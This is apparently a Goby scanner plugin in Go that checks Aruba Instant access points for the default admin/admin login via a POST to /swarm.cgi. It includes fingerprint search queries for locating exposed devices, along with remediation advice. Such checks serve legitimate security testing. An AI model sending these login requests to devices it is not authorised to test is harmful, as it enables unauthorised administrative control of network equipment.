package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Aruba Instant swarm.cgi file default password vulnerability",
    "Description": "<p>Aruba Instant is an AP device. The device has a default password, and attackers can control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.</p>",
    "Impact": "<p>Aruba Instant password vulnerability</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Instant",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Aruba Instant swarm.cgi 文件默认口令漏洞",
            "Product": "Instant",
            "Description": "<p><span style=\"font-size: medium;\">Aruba Instant&nbsp;是一款AP设备。该设备存在默认口令，<span style=\"color: rgb(53, 53, 53);\">攻击者可通过默认口令admin/admin漏洞控制整个平台，使用管理员权限操作核心的功能。</span></span><br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: medium;\">Aruba Instant</span><span style=\"color: rgb(22, 51, 102); font-size: medium;\">&nbsp;是一款AP设备。该设备存在默认口令，</span><span style=\"font-size: medium; color: rgb(53, 53, 53);\">攻击者可通过默认口令admin/admin漏洞控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Aruba Instant swarm.cgi file default password vulnerability",
            "Product": "Instant",
            "Description": "<p>Aruba Instant is an AP device. The device has a default password, and attackers can control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Aruba Instant password vulnerability</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"jscripts/third_party/raphael-treemap.min.js\" || body=\"jscripts/third_party/highcharts.src.js\"",
    "GobyQuery": "body=\"jscripts/third_party/raphael-treemap.min.js\" || body=\"jscripts/third_party/highcharts.src.js\"",
    "Author": "13eczou",
    "Homepage": "https://www.aruba.com/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://fofa.info"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/swarm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "opcode=login&user=admin&passwd=admin&refresh=false&nocache=0.17699820340903838"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/swarm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "opcode=login&user=admin&passwd=admin&refresh=false&nocache=0.17699820340903838"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10363"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
